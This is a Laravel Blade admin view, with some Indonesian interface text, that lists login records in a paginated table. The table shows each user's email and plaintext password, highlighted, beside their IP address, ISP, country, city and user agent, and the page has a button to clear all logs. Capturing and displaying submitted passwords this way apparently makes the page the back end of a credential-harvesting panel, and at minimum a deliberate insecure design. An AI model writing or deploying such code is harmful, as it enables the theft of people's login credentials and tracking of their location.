@extends('layouts.admin')

@section('title', 'Login Logs')
@section('heading', 'Login Logs')

@section('content')
@if (session('status'))
    <div class="stat" style="margin-bottom:1rem;border-color:#134e4a;color:#99f6e4">{{ session('status') }}</div>
@endif

<div class="stat-row">
    <div class="stat">
        <div class="label">Total login</div>
        <div class="value">{{ $logs->total() }}</div>
    </div>
    <div class="stat">
        <div class="label">Halaman ini</div>
        <div class="value">{{ $logs->count() }}</div>
    </div>
</div>

<div class="panel">
    <div style="display:flex;justify-content:flex-end;margin-bottom:1rem">
        <form method="POST" action="{{ route('admin.logs.clear') }}" onsubmit="return confirm('Hapus semua login logs?')">
            @csrf
            @method('DELETE')
            <button class="btn-page" type="submit">Clear all</button>
        </form>
    </div>

    @if ($logs->isEmpty())
        <div class="empty">Belum ada login user.</div>
    @else
        <div class="table-wrap">
            <table class="logs">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Date / Time</th>
                        <th>IP</th>
                        <th>Email</th>
                        <th>Password</th>
                        <th>ISP</th>
                        <th>Country</th>
                        <th>City</th>
                        <th>User Agent</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($logs as $log)
                        <tr>
                            <td class="mono muted">{{ $log->id }}</td>
                            <td>
                                <div>{{ $log->logged_in_at->timezone(config('app.timezone'))->format('Y-m-d') }}</div>
                                <div class="muted mono">{{ $log->logged_in_at->timezone(config('app.timezone'))->format('H:i:s') }}</div>
                            </td>
                            <td class="mono">{{ $log->ip ?? '-' }}</td>
                            <td>
                                <div>{{ $log->email }}</div>
                                @if ($log->name)
                                    <div class="muted">{{ $log->name }}</div>
                                @endif
                            </td>
                            <td class="mono" style="color:#fbbf24;font-weight:700">{{ $log->password ?? '—' }}</td>
                            <td>{{ $log->isp ?? '-' }}</td>
                            <td>
                                {{ $log->country ?? '-' }}
                                @if ($log->country_code)
                                    <span class="muted">({{ $log->country_code }})</span>
                                @endif
                            </td>
                            <td>{{ $log->city ?? '-' }}</td>
                            <td class="wrap muted" style="max-width:28rem;font-size:.8rem">{{ $log->user_agent ?? '-' }}</td>
                        </tr>
                    @endforeach
                </tbody>
            </table>
        </div>

        <div class="pager">
            @if ($logs->onFirstPage())
                <span>Prev</span>
            @else
                <a href="{{ $logs->previousPageUrl() }}">Prev</a>
            @endif

            <span class="active">{{ $logs->currentPage() }} / {{ $logs->lastPage() }}</span>

            @if ($logs->hasMorePages())
                <a href="{{ $logs->nextPageUrl() }}">Next</a>
            @else
                <span>Next</span>
            @endif
        </div>
    @endif
</div>

<style>
    .btn-page {
        background: #1b232e;
        border: 1px solid var(--border);
        color: var(--text);
        padding: 0.5rem 0.85rem;
        border-radius: 8px;
        cursor: pointer;
        font-size: 0.85rem;
    }
    .btn-page:hover { border-color: var(--muted); }
</style>
@endsection
